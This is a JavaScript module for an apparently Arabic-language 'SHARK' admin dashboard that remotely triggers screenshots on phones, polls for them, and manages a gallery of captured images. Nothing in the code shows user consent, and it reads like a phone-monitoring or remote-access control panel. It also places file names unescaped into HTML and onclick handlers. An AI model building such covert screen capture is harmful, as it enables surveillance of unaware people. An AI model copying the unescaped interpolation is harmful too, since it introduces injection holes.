/**
 * 🦈 SHARK ADMIN DASHBOARD — SCREENSHOTS & GALLERY
 * Handles on-demand remote screen capture polling and historical gallery inspection.
 */

window.SHARK = window.SHARK || {};

let currentScreenshotDeviceId = null;
let screenshotInterval = null;
let currentGalleryDeviceId = null;

// ── REAL-TIME SCREENSHOT CAPTURE ──────────────────────────────────────────

async function openScreenshotModal(deviceId) {
    currentScreenshotDeviceId = deviceId;
    const modal = document.getElementById('screenshotModal');
    const image = document.getElementById('screenshotImage');
    const loader = document.getElementById('screenshotLoader');
    const status = document.getElementById('screenshotStatus');

    if (modal) modal.style.display = 'flex';
    if (image) image.style.display = 'none';
    if (loader) loader.style.display = 'block';
    if (status) status.textContent = 'جاري طلب الصورة من الهاتف (سيستغرق ثواني معدودة)...';

    try {
        const { error } = await window.sb.from('devices').update({ 
            screenshot_requested: true, 
            screenshot_url: '' 
        }).eq('device_id', deviceId);

        if (error) {
            showToast('❌ خطأ في طلب الصورة: ' + (error.message || error), 'error');
            closeScreenshotModal();
            return;
        }

        if (screenshotInterval) clearInterval(screenshotInterval);
        screenshotInterval = setInterval(checkScreenshotStatus, 2000);
    } catch (err) {
        console.error("Screenshot request error:", err);
        showToast('خطأ في الاتصال بالخادم', 'error');
        closeScreenshotModal();
    }
}

function closeScreenshotModal() {
    const modal = document.getElementById('screenshotModal');
    if (modal) modal.style.display = 'none';
    if (screenshotInterval) clearInterval(screenshotInterval);
    currentScreenshotDeviceId = null;
}

async function checkScreenshotStatus() {
    if (!currentScreenshotDeviceId) return;
    try {
        const { data, error } = await window.sb.from('devices')
            .select('screenshot_requested, screenshot_url')
            .eq('device_id', currentScreenshotDeviceId)
            .maybeSingle();

        if (error) {
            console.error("Screenshot polling error:", error);
            return;
        }

        if (data && data.screenshot_requested === false) {
            const loader = document.getElementById('screenshotLoader');
            const status = document.getElementById('screenshotStatus');
            const img = document.getElementById('screenshotImage');

            if (loader) loader.style.display = 'none';
            clearInterval(screenshotInterval);

            if (data.screenshot_url) {
                // Fetch secure signed URL if stored as path, or direct URL
                let displayUrl = data.screenshot_url;
                if (!data.screenshot_url.startsWith('http')) {
                    const { data: signed } = await window.sb.storage
                        .from('screenshots')
                        .createSignedUrl(data.screenshot_url, 300);
                    displayUrl = signed?.signedUrl || data.screenshot_url;
                }

                if (img) {
                    img.src = displayUrl + '#t=' + Date.now();
                    img.style.display = 'block';
                }
                if (status) status.textContent = '✅ تم استلام الصورة بنجاح من الهاتف!';
                showToast('✅ تم استلام لقطة الشاشة', 'success');
            } else {
                if (status) status.textContent = '❌ فشل التقاط الصورة من الهاتف (ربما التطبيق مغلق).';
                showToast('❌ تعذر التقاط الصورة من الهاتف', 'error');
            }
        }
    } catch (err) {
        console.error("Screenshot polling check failed:", err);
    }
}

// ── GALLERY ───────────────────────────────────────────────────────────────

async function openGalleryModal(deviceId) {
    currentGalleryDeviceId = deviceId;
    const modal = document.getElementById('galleryModal');
    if (modal) modal.style.display = 'flex';
    await loadGallery();
}

function closeGalleryModal() {
    const modal = document.getElementById('galleryModal');
    if (modal) modal.style.display = 'none';
    currentGalleryDeviceId = null;
}

async function loadGallery() {
    if (!currentGalleryDeviceId) return;
    const container = document.getElementById('galleryContainer');
    const status = document.getElementById('galleryStatus');

    if (container) {
        container.innerHTML = '<div style="grid-column: 1/-1; text-align:center; padding: 40px; color: var(--neon);"><i class="fas fa-circle-notch fa-spin fa-3x"></i><p style="margin-top:15px;">جاري جلب الصور...</p></div>';
    }
    if (status) status.textContent = 'جاري البحث في الأرشيف...';

    try {
        const { data, error } = await window.sb.storage.from('screenshots').list('', {
            search: currentGalleryDeviceId,
            sortBy: { column: 'created_at', order: 'desc' }
        });

        if (error) throw error;

        if (!data || data.length === 0) {
            if (container) {
                container.innerHTML = '<div style="grid-column: 1/-1; text-align:center; padding: 40px; color: var(--muted);"><i class="fas fa-box-open fa-3x"></i><p style="margin-top:15px;">لا توجد صور مسجلة لهذا الجهاز حتى الآن.</p></div>';
            }
            if (status) status.textContent = 'لا توجد لقطات محفوظة';
            return;
        }

        if (status) status.textContent = `تم العثور على ${data.length} صورة`;

        if (container) {
            container.innerHTML = data.map(file => {
                const urlData = window.sb.storage.from('screenshots').getPublicUrl(file.name).data;
                const url = urlData ? urlData.publicUrl : '';
                const dateStr = new Date(file.created_at).toLocaleString('ar-EG', { dateStyle: 'short', timeStyle: 'medium' });

                return `
                    <div style="position:relative; border: 1px solid rgba(0,243,255,0.2); border-radius:8px; overflow:hidden; background:#0a0f18; box-shadow: 0 4px 6px rgba(0,0,0,0.3); transition: transform 0.2s;" onmouseover="this.style.transform='scale(1.02)'" onmouseout="this.style.transform='scale(1)'">
                        <a href="${url}" target="_blank" rel="noopener">
                            <img src="${url}" style="width:100%; height:180px; object-fit:cover; display:block;" alt="Screenshot">
                        </a>
                        <button onclick="deleteScreenshot('${file.name}')" title="حذف الصورة" style="position:absolute; top:8px; right:8px; background:rgba(220,38,38,0.9); border:none; color:white; border-radius:6px; padding:6px 10px; cursor:pointer;">
                            <i class="fas fa-trash"></i>
                        </button>
                        <div style="position:absolute; bottom:0; width:100%; background:rgba(0,0,0,0.85); backdrop-filter: blur(4px); color:#a5b4fc; font-size:11px; font-family:'JetBrains Mono',monospace; text-align:center; padding:6px 2px;">
                            ${dateStr}
                        </div>
                    </div>
                `;
            }).join('');
        }
    } catch (err) {
        console.error("Gallery load error:", err);
        if (status) status.textContent = 'حدث خطأ أثناء جلب الصور.';
        if (container) {
            container.innerHTML = '<div style="grid-column: 1/-1; text-align:center; color: #ef4444;"><i class="fas fa-exclamation-triangle fa-2x"></i><p>فشل تحميل الصور</p></div>';
        }
    }
}

async function deleteScreenshot(fileName) {
    if (!confirm('هل أنت متأكد من حذف هذه الصورة نهائياً؟')) return;
    try {
        const { error } = await window.sb.storage.from('screenshots').remove([fileName]);
        if (error) throw error;
        showToast('✅ تم حذف الصورة بنجاح', 'success');
        loadGallery();
    } catch (err) {
        showToast('❌ خطأ في حذف الصورة', 'error');
    }
}

async function deleteAllScreenshots() {
    if (!currentGalleryDeviceId) return;
    if (!confirm('⚠️ تحذير: هل أنت متأكد من حذف جميع صور هذا الجهاز نهائياً؟ لا يمكن التراجع!')) return;

    const status = document.getElementById('galleryStatus');
    if (status) status.textContent = 'جاري الحذف...';

    try {
        const { data } = await window.sb.storage.from('screenshots').list('', { search: currentGalleryDeviceId });
        if (data && data.length > 0) {
            const filesToRemove = data.map(f => f.name);
            await window.sb.storage.from('screenshots').remove(filesToRemove);
            showToast(`✅ تم حذف ${filesToRemove.length} صورة بنجاح`, 'success');
            loadGallery();
        } else {
            showToast('لا توجد صور للحذف', 'info');
        }
    } catch (err) {
        showToast('❌ خطأ في الحذف الجماعي', 'error');
    }
}

// Event Listeners
document.getElementById('screenshotModal')?.addEventListener('click', e => {
    if (e.target.id === 'screenshotModal') closeScreenshotModal();
});
document.getElementById('refreshScreenshotBtn')?.addEventListener('click', () => {
    if (currentScreenshotDeviceId) openScreenshotModal(currentScreenshotDeviceId);
});
document.getElementById('galleryModal')?.addEventListener('click', e => {
    if (e.target.id === 'galleryModal') closeGalleryModal();
});
document.getElementById('refreshGalleryBtn')?.addEventListener('click', loadGallery);

// Expose globals
window.openScreenshotModal = openScreenshotModal;
window.closeScreenshotModal = closeScreenshotModal;
window.openGalleryModal = openGalleryModal;
window.closeGalleryModal = closeGalleryModal;
window.deleteScreenshot = deleteScreenshot;
window.deleteAllScreenshots = deleteAllScreenshots;

window.SHARK.screenshots = {
    openScreenshotModal,
    closeScreenshotModal,
    openGalleryModal,
    closeGalleryModal,
    loadGallery,
    deleteScreenshot,
    deleteAllScreenshots
};
